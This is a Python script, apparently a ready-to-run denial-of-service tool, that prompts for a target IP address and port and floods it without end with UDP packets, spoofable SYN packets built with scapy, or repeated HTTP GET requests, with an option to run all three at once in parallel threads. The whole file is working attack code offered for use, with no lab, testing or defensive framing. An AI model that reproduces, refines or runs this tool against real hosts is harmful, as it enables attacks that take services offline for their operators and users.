#!/usr/bin/env python3
import os
import time
import socket
import random
from scapy.all import IP, TCP, send  # For SYN flood
from threading import Thread

# Banner
def banner():
    os.system("clear" if os.name == "posix" else "cls")
    os.system("figlet DDoS Attack" if os.name == "posix" else "echo DDoS Attack")

# UDP Flood Attack
def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"[UDP] Sent {sent} packets to {ip}:{port}")
        port = port + 1 if port < 65534 else 1

# SYN Flood Attack
def syn_flood(ip, port):
    while True:
        packet = IP(dst=ip) / TCP(dport=port, flags="S")
        send(packet, verbose=False)
        print(f"[SYN] Sent SYN packet to {ip}:{port}")

# HTTP Flood Attack
def http_flood(ip, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            print(f"[HTTP] Sent GET request to {ip}:{port}")
            sock.close()
        except socket.error:
            print(f"[HTTP] Connection to {ip}:{port} failed.")

# Main Function
def main():
    banner()
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    print("\n1. UDP Flood\n2. SYN Flood\n3. HTTP Flood\n4. All")
    choice = int(input("Choose attack type: "))

    # Start the selected attack
    if choice == 1:
        udp_flood(ip, port)
    elif choice == 2:
        syn_flood(ip, port)
    elif choice == 3:
        http_flood(ip, port)
    elif choice == 4:
        # Launch all attacks concurrently
        udp_thread = Thread(target=udp_flood, args=(ip, port))
        syn_thread = Thread(target=syn_flood, args=(ip, port))
        http_thread = Thread(target=http_flood, args=(ip, port))
        udp_thread.start()
        syn_thread.start()
        http_thread.start()

        udp_thread.join()
        syn_thread.join()
        http_thread.join()
    else:
        print("Invalid choice. Exiting...")

# Entry Point
if __name__ == "__main__":
    main()
